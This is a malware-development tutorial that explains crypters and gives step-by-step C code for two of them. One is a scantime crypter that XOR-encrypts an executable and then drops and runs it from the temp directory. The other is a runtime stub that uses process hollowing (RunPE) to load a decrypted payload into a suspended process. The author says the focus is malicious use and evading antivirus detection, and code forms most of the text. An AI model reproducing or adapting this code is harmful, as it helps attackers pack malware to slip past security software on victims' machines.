---
author(s):
  - Userware
tags:
  - malware-development
credits:
  - dtm
---
# WinAPI

## An Introduction to Crypters

For those who do not know what crypters are, they are software designed to protect the information within a file (usually some sort of executable format) and, on execution, be able to provide said information intact after extracting it with a decryption routine. Please note that while crypters can be used with malicious intent, it is also popular with obfuscating data in an effort to prevent reverse engineering. In this paper, we will focus on malicious usage. So how does this work? Let’s begin by identifying the aspects of crypters and seeing a graphical representation of their role.

The crypter is responsible for encrypting a target object.

```
+-------------+      +-----------+      +-------------------+     +--------+
|  Your file  |  ->  |  Crypter  |  =>  |  Encrypted file   |  +  |  Stub  |
+-------------+      +-----------+      +-------------------+     +--------+
```

The **stub** is the sector of the encrypted object which provides the extraction and, sometimes, the execution of said object.

```
+------------------+     +--------+                  +---------------+
|  Encrypted file  |  +  |  Stub  |  = Execution =>  | Original File | 
+------------------+     +--------+                  +---------------+
```

### Scantime Crypters

These types of crypters are known as **scantime** due to their capability of obscuring data on disk which is where antivirus software can run a scan on the file with signature-based detection, for example. In this stage, the antivirus software will never be able to detect any malicious activity provided that the applied obfuscation is robust.

### Runtime Crypters

These crypters take it to the next level to deobfuscate the data on run in memory as it is required. By doing so, the antivirus will allow it to be loaded and executed _before_ it is able to react to any malicious activity. In this stage, it is pretty much game over if an application is quick enough to administer its payload and complete its objective. It is entirely possible for the malware to trigger a heuristic-based detection from the antivirus software in the execution stage and so malware authors should be careful.

Now that we’ve covered the high level, let’s see an example implementation of both types.

## Coding a Scantime Crypter  

The scantime crypter is the easier of the two since it does not require the knowledge of virtual memory and processes/threads. Essentially, the stub will deobfuscate the file, drop it onto disk somewhere and then execute it. The following documents a possible scantime crypter design.

> [!NOTE]
> For the sake of cleanliness and readability, I will not be including error checks.

### Crypter and Stub Pseudocode

```
1. Check if there is a command line argument
+-> 2. If there is a command line argument, act as a crypter to crypt the file
|   3. Open the target file
|   4. Read file contents
|   5. Encrypt the file contents
|   6. Create a new file
|   7. Write the encrypted into the new file
|   8. Finish
|
+-> 2. If there is no command line argument, act as the stub
    3. Open encrypted file
    4. Read file contents
    5. Decrypt the file contents
    6. Create a temporary file
    7. Write the decrypted into the temporary file
    8. Execute the file
    9. Finish
```

This design implements both the crypter and the stub in the same executable and we can do so because the two routines are pretty similar to each other. Let’s go through a possible design in code.
First, we will need to define main and the two conditions which define the execution as a crypter or a stub.

```c
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (__argc < 2) {
        // stub routine
    } else {
        // crypter routine
    }

    return EXIT_SUCCESS;
}
```

Since we are defining the application as a window-based application, we cannot retrieve the `argc` and `argv` as we normally would in a console-based application but Microsoft has provided a solution to that with `__argc` and `__argv`. If the command line argument `__argv[1]` exists, the application will attempt to crypt the specified file, else, it will try to decrypt an existing crypted file.

Moving onto the crypter routine, we’ll require the handle to the specified file of `__argv[1]` and its size so we can copy its bytes into a buffer to crypt.

```c
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (__argc < 2) {
        // stub routine
    } else {
        // crypter routine
        // open file to crypt
        HANDLE hFile = CreateFile(__argv[1], FILE_READ_ACCESS, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        // get file size
        DWORD dwFileSize = GetFileSize(hFile, NULL);
        
        // crypt and get crypted bytes
        LPVOID lpFileBytes = Crypt(hFile, dwFileSize);
    }

    return EXIT_SUCCESS;
}
```

The `Crypt` function will essentially read the file contents into a buffer and then crypt them and then return a pointer to the buffer with the encrypted bytes.

```c
LPVOID Crypt(HANDLE hFile, DWORD dwFileSize) {
    // allocate buffer for file contents
    LPVOID lpFileBytes = malloc(dwFileSize);
    // read the file into the buffer
    ReadFile(hFile, lpFileBytes, dwFileSize, NULL, NULL);

    // apply XOR encryption
    int i;
    for (i = 0; i < dwFileSize; i++) {
        *((LPBYTE)lpFileBytes + i) ^= Key[i % sizeof(Key)];
    }

    return lpFileBytes;
}
```

Now that we have the encrypted bytes, we will need to create a new file and then write these bytes into it.

```c
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (__argc < 2) {
        // stub routine
    } else {
        // crypter routine
        
        ...

        // get crypted file name in current directory
        CHAR szCryptedFileName[MAX_PATH];
        GetCurrentDirectory(MAX_PATH, szCryptedFileName);
        strcat(szCryptedFileName, "\\");
        strcat(szCryptedFileName, CRYPTED_FILE);
        // open handle to new crypted file
        HANDLE hCryptedFile = CreateFile(szCryptedFileName, FILE_WRITE_ACCESS, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        // write to crypted file
        WriteFile(hCryptedFile, lpFileBytes, dwFileSize, NULL, NULL);
        CloseHandle(hCryptedFile);
        free(lpFileBytes);
    }

    return EXIT_SUCCESS;
}
```

And that’s pretty much it for the crypter section. Note that we’ve used a simple XOR to encrypt the contents of the file which _might_ not be enough if we have a small key. If we wanted to be more on the safe side, we can use other encryption schemes such as RC4 or (x)TEA. We do not require full-fledged unbroken cryptoalgorithms since the purpose is to avoid signature-based detection and would hence be complete overkill. Keep it small and simple.

Let’s continue onto the stub routine. For the stub, we want to retrieve the encrypted file in its current directory and then write the decrypted contents into a temporary file for execution.

We’ll begin by getting the current director, then opening the file and getting the file size.

```c
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (__argc < 2) {
        // stub routine
        // get target encrypted file
        CHAR szEncryptedFileName[MAX_PATH];
        GetCurrentDirectory(MAX_PATH, szEncryptedFileName);
        strcat(szEncryptedFileName, "\\");
        strcat(szEncryptedFileName, CRYPTED_FILE);

        // get handle to file
        HANDLE hFile = CreateFile(szEncryptedFileName, FILE_READ_ACCESS, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

        // get file size
        DWORD dwFileSize = GetFileSize(hFile, NULL);
    } else {
        // crypter routine
    }

    return EXIT_SUCCESS;
}
```

Pretty much the same as the crypter routine. Next, we will read the file contents and get the decrypted bytes. Since the XOR operation restores values given a common bit, we can simply reuse the `Crypt` function. After that, we will need to create a temporary file and write the decrypted bytes into it.

```c
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (__argc < 2) {
        // stub routine
        
        ...

        // decrypt and obtain decrypted bytes
        LPVOID lpFileBytes = Crypt(hFile, dwFileSize);
        CloseHandle(hFile);

        // get file in temporary directory
        CHAR szTempFileName[MAX_PATH];
        GetTempPath(MAX_PATH, szTempFileName);
        strcat(szTempFileName, DECRYPTED_FILE);

        // open handle to temp file
        HANDLE hTempFile = CreateFile(szTempFileName, FILE_WRITE_ACCESS, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        // write to temporary file
        WriteFile(hTempFile, lpFileBytes, dwFileSize, NULL, NULL);
        // clean up
        CloseHandle(hTempFile);
        free(lpFileBytes);
    } else {
        // crypter routine
    }

    return EXIT_SUCCESS;
}
```

Finally, we’ll need to execute the decrypted application.

```c
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (__argc < 2) {
        // stub routine
        
        ...

        // execute file
        ShellExecute(NULL, NULL, szTempFileName, NULL, NULL, 0);
    } else {
        // crypter routine
    }

    return EXIT_SUCCESS;
}
```

Do note that once the decrypted application has been written to disk, it will be completely exposed to antivirus software’s signature-based detection and is likely to catch most malware. Because of this, malware authors require something which will allow the execution of their application(s) without this flaw.

This concludes the scantime crypter.

## Coding a Runtime Crypter

For the runtime crypter, I will only cover the stub since that includes the more complex material so we will assume the application has already been encrypted. A popular technique which these crypters use is called _RunPE_ or _Dynamic Forking/Process Hollowing_. How this works is the stub will first decrypt an application’s encrypted bytes and then emulate the Windows loader by pushing them into the virtual memory space of a suspended process. Once that has been completed, the stub will resume the suspended process and finish.

> [!NOTE]
> For the sake of cleanliness and readability, I will not be including error checks.

### Stub Pseudocode

1. Decrypt application
2. Create suspended process
3. Preserve process's thread context
4. Hollow out process's virtual memory space
5. Allocate virtual memory
6. Write application's header and sections into allocated memory
7. Set modified thread context
8. Resume process
9. Finish

As we can see, this requires quite a bit of knowledge of Windows internals, including the PE file structure, Windows memory manipulation and processes/threads. I would highly recommend the reader to cover these fundamentals to understand the following material.

Firstly, let’s set up two routines in main, one for decrypting the encrypted application and the other to load it into memory for execution.

```c
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    Decrypt();
    RunPE();

    return EXIT_SUCCESS;
}
```

The `Decrypt` function will be entirely dependent on the encryption scheme used to encrypt the application but here is an example code using XOR.

```c
VOID Decrypt(VOID) {
    int i;
    for (i = 0; i < sizeof(Shellcode); i++) {
        Shellcode[i] ^= Key[i % sizeof(Key)];
    }
}
```

Now that the application has been decrypted, let’s take a look at where the magic happens. Here, we will verify that the application is a valid PE file by checking the DOS and PE signatures.

```c
VOID RunPE(VOID) {
    // check valid DOS signature
    PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)Shellcode;
    if (pidh->e_magic != IMAGE_DOS_SIGNATURE) return;

    // check valid PE signature
    PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)Shellcode + pidh->e_lfanew);
    if (pinh->Signature != IMAGE_NT_SIGNATURE) return;
}
```

Now, we will create the suspended process.

```c
VOID RunPE(VOID) {
    ...

    // get own full file name
    CHAR szFileName[MAX_PATH];
    GetModuleFileName(NULL, szFileName, MAX_PATH);

    // initialize startup and process information
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    // required to set size of si.cb before use
    si.cb = sizeof(si);
    // create suspended process
    CreateProcess(szFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

}
```

> [!NOTE]
> `szFileName` can be a full path to any executable file such as `explorer.exe` or `iexplore.exe` but for this example, we will be using the stub's file. The `CreateProcess` function will create a child process of the specified file in a suspended state so that we can modify its virtual memory contents to our needs. Once that has been achieved, we should obtain its thread context before changing anything.

```c
VOID RunPE(VOID) {
    ...

    // obtain thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.Thread, &ctx);

}
```

And now will hollow out an area of the process’s virtual memory so we can allocate our own space for the application. For this, we require a function which is not readily available to us so we will require a function pointer to point to a dynamically retrieved function from the `ntdll.dll` DLL.

```c
typedef NTSTATUS (*fZwUnmapViewOfSection)(HANDLE, PVOID);

VOID RunPE(VOID) {
    ...

    // dynamically retrieve ZwUnmapViewOfSection function from ntdll.dll
    fZwUnmapViewOfSection pZwUnmapViewOfSection = (fZwUnmapViewOfSection)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwUnmapViewOfSection");
    // hollow process at virtual memory address 'pinh->OptionalHeader.ImageBase'
    pZwUnMapViewOfSection(pi.hProcess, (PVOID)pinh->OptionalHeader.ImageBase);

    // allocate virtual memory at address 'pinh->OptionalHeader.ImageBase' of size `pinh->OptionalHeader.SizeofImage` with RWX permissions
    LPVOID lpBaseAddress = VirtualAllocEx(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase, pinh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

}
```

Since the suspended process has its own content inside its virtual memory space, we are required to unmap it from memory and then allocate our own so that we have the correct access and permissions to load our application’s image. We will do this with the `WriteProcessMemory` function. First, we need to write the headers and then each section individually as the Windows loader would. This section requires a thorough understanding of the PE file structure.

```c
VOID RunPE(VOID) {
    ...

    // write header
    WriteProcessMemory(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase, Shellcode, pinh->OptionalHeader.SizeOfHeaders, NULL);

    // write each section
    int i;
    for (i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
        // calculate and get ith section
        PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD)Shellcode + pidh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i);
        // write section data
        WriteProcessMemory(pi.hProcess, (LPVOID)(lpBaseAddress + pish->VirtualAddress), (LPVOID)((DWORD)Shellcode + pish->PointerToRawData), pish->SizeOfRawData, NULL);
    }

}
```

Now that everything is in place, we will simply modify the context’s address of entry point and then resume the suspended thread.

```c
VOID RunPE(VOID) {
    ...
 
    // set appropriate address of entry point
    ctx.Eax = pinh->OptionalHeader.ImageBase + pinh->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);
 
    // resume and execute our application
    ResumeThread(pi.hThread);
}
```

---
## References

- [0x00sec: Crypters - Instruments of the Underground](https://0x00sec.org/t/crypters-instruments-of-the-underground/386)